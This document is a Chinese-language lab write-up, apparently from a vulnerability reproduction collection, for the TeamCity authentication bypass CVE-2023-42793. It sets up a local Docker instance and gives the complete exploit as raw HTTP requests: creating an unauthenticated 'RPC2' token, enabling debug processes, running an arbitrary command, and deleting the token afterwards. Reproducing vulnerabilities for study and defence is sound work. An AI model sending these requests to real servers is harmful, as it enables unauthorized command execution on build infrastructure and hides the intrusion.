# Jetbrains TeamCity 认证绕过导致远程命令执行漏洞（CVE-2023-42793）

TeamCity 是 JetBrains 的构建管理和持续集成服务器。

在 TeamCity 2023.05.3 版本及以前，存在一处由于逻辑错误导致的认证绕过漏洞，攻击者利用该漏洞最终可以在目标服务器上执行任意命令。

参考链接：

- <https://www.sonarsource.com/blog/teamcity-vulnerability/>
- <https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/>

## 漏洞环境

执行如下命令启动一个 TeamCity 2023.05.3 服务器：

```
docker compose up -d
```

服务启动后，你需要打开`http://localhost:8111`并执行一系列初始化操作：

![](1.png)

## 漏洞复现

造成这个漏洞的原因是 TeamCity 内部对于所有以`/RPC2`为后缀结尾的请求都不认证权限。

而正好添加API Token的请求的结尾参数是Token的名字，我们可以添加一个名字为`RPC2`的API Token：

```
POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

![](2.png)

这样就成功绕过权限认证生成了一个新的Token。使用该Token来开启调试模式：

```
POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0


```

![](3.png)

开启调试模式后，就可以执行任意命令了：

```
POST /app/rest/debug/processes?exePath=id HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0


```

![](4.png)

利用结束后，我们最好能够删除名为`RPC2`的API Token，避免对业务造成问题：

```
DELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: localhost:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
